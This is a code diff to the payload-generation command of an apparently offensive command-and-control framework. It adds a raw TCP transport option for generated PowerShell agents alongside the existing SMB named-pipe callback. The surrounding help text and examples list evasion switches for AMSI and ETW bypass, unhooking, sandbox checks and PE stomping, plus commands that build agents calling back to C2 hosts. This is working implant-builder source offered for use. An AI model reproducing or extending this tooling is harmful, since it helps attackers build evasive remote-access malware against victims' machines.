@@ -48,6 +48,8 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "no_sbl": False,
         "target_os": "win10",
         "debug": False,
+        "transport": "pipe",
+        "tcp_port": 0,
     }
 
     # Boolean flags (no argument following)
@@ -99,6 +101,14 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             opts["listener"] = parts[i + 1]; i += 2
         elif parts[i] == "--pipe-host" and i + 1 < len(parts):
             opts["pipe_host"] = parts[i + 1]; i += 2
+        elif parts[i] == "--transport" and i + 1 < len(parts):
+            val = parts[i + 1]
+            if val not in ("pipe", "tcp"):
+                console.print(f"[red]--transport must be pipe or tcp, got: {val}[/red]")
+                return
+            opts["transport"] = val; i += 2
+        elif parts[i] == "--tcp-port" and i + 1 < len(parts):
+            opts["tcp_port"] = int(parts[i + 1]); i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -257,9 +267,22 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
         return
 
     info = target_listener.info()
-    pipe_name = info["port"].replace("pipe:", "")
+    port_str = info.get("port", "")
+    # Parse pipe name from listener info (may contain ", tcp:NNNN")
+    pipe_name = port_str.split(",")[0].replace("pipe:", "").strip()
 
-    # Resolve pipe host: --pipe-host > --url > listener interface > fallback
+    transport = opts["transport"]
+    tcp_port = opts["tcp_port"]
+
+    # Auto-detect raw TCP port from listener if transport=tcp and no explicit port
+    if transport == "tcp" and not tcp_port:
+        if hasattr(target_listener, "raw_port") and target_listener.raw_port:
+            tcp_port = target_listener.raw_port
+        else:
+            console.print("[red]✗ --tcp-port required (or listener must have raw_port configured)[/red]")
+            return
+
+    # Resolve host: --pipe-host > --url > listener interface > fallback
     if opts["pipe_host"]:
         pipe_host = opts["pipe_host"]
     elif info["interface"] not in ("0.0.0.0", ""):
@@ -276,9 +299,14 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
             "[yellow]  Use --pipe-host <IP> to set the C2 address the agent connects to.[/yellow]"
         )
 
-    console.print(f"[cyan]Generating PowerShell SMB agent...[/cyan]")
-    console.print(f"  Listener:  {target_listener.name}")
-    console.print(f"  Pipe:      \\\\{pipe_host}\\pipe\\{pipe_name}")
+    if transport == "tcp":
+        console.print(f"[cyan]Generating PowerShell TCP agent...[/cyan]")
+        console.print(f"  Listener:  {target_listener.name}")
+        console.print(f"  Target:    {pipe_host}:{tcp_port} (raw TCP)")
+    else:
+        console.print(f"[cyan]Generating PowerShell SMB agent...[/cyan]")
+        console.print(f"  Listener:  {target_listener.name}")
+        console.print(f"  Pipe:      \\\\{pipe_host}\\pipe\\{pipe_name}")
     console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
     if opts["kill_date"]:
         console.print(f"  Kill date: {opts['kill_date']}")
@@ -311,6 +339,8 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
             no_sbl=opts["no_sbl"],
             debug=opts["debug"],
             output_path=opts["output"],
+            transport=transport,
+            tcp_port=tcp_port,
         )
     except Exception as e:
         console.print(f"[red]✗ Build failed: {e}[/red]")
@@ -330,7 +360,9 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
     size_kb = out_path.stat().st_size / 1024
     psk_b64 = base64.b64encode(psk).decode()
 
+    transport_label = f"tcp:{tcp_port}" if transport == "tcp" else f"pipe:{pipe_name}"
     console.print(f"[green]✓ PowerShell agent: {out_path} ({size_kb:.1f} KB)[/green]")
+    console.print(f"[green]✓ Transport:        {transport_label}[/green]")
     console.print(f"[green]✓ PSK saved:        {psk_path}[/green]")
     console.print(f"[green]✓ PSK registered with listener '{target_listener.name}'[/green]")
     console.print()
@@ -352,8 +384,10 @@ def _print_help():
   --format, -f FMT      Output format: exe (default), dll, or powershell
   --listener, -l NAME   Target listener by name (required for powershell
                          unless exactly one SMB listener is running)
-  --pipe-host IP        C2 IP/hostname the PS agent connects to via SMB
+  --pipe-host IP        C2 IP/hostname the agent connects to
                          (overrides listener interface and --url)
+  --transport MODE      Transport for PS agent: pipe (default) or tcp
+  --tcp-port PORT       Raw TCP port (required when --transport tcp)
 
 [bold]Common options:[/bold]
   --url, -u URL         C2 callback URL (C agent) / pipe host fallback (PS)
@@ -392,6 +426,7 @@ def _print_help():
   generate --format powershell --listener SMB --pipe-host 172.17.10.121
   generate --format powershell --listener SMB --pipe-host 10.0.0.5 --sleep 30
   generate --format powershell --listener SMB --no-amsi --no-etw
+  generate --format powershell --transport tcp --tcp-port 8888 --pipe-host 10.0.0.5
   generate --url https://cdn.example.com/api/v1 --sleep 30
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
